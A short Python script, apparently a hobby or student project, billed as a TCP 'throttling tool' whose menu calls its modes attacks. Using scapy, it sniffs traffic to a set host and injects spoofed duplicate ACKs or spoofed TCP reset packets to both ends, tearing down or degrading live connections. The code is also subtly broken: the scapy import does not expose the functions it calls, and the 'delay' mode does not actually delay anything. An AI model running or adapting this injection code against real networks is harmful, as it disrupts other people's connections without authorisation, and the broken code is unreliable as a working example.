"""
Implementation of throttling tool for TCP connections
"""

import scapy


"""
variables
"""
#ip addresses for the client and server
src_ip = '198.168.0.157'                     #change ip address here 
dest_ip = '192.168.0.167'                    #change ip address here

delay_time = 0.5                             #delay time in seconds
filter = 'tcp and host {}'.format(dest_ip)   #packet filter to capture TCP packets


"""
functions 
"""
#approach 1: delaying packets by sending 3 ACK to simulate packet loss and force retransmissions 
def delay_packet(packet):    
    for i in range(3):
        scapy.send(scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst)/scapy.TCP(dport=packet[scapy.TCP].sport, 
                            sport=packet[scapy.TCP].dport, flags="A", seq=packet[scapy.TCP].seq, ack=packet[scapy.TCP].ack+1))


#approach 2: sending a TCP reset packet to drop the connection entirely  
def reset_packet(packet):
    #sending reset packets to both the client and server 
    scapy.send(scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst)/scapy.TCP(dport=packet[scapy.TCP].sport, 
                        sport=packet[scapy.TCP].dport, seq=packet[scapy.TCP].ack, ack=packet[scapy.TCP].seq,flags='R'), verbose=False)
    
    scapy.send(scapy.IP(dst=packet[scapy.IP].dst, src=packet[scapy.IP].src)/scapy.TCP(dport=packet[scapy.TCP].dport, 
                        sport=packet[scapy.TCP].sport, seq=packet[scapy.TCP].seq, ack=packet[scapy.TCP].ack, flags='R'), verbose=False)    



"""
main
"""
if __name__=="__main__":
    # Wait for user input on the desired throttling mode
    while True:
        mode = input('Attacks: delay / reset: ')

        #for delayed packets
        if mode == 'delay':
            print('Delaying packets...')
            scapy.sniff(filter=filter, count=100000, prn=delay_packet)

        #for reset packets
        elif mode == 'reset':
            print('Resetting packets...')
            scapy.sniff(filter=filter, count=1000, prn=reset_packet)


        #for invalid input 
        else:
            print('Invalid input. Please enter delay or reset')
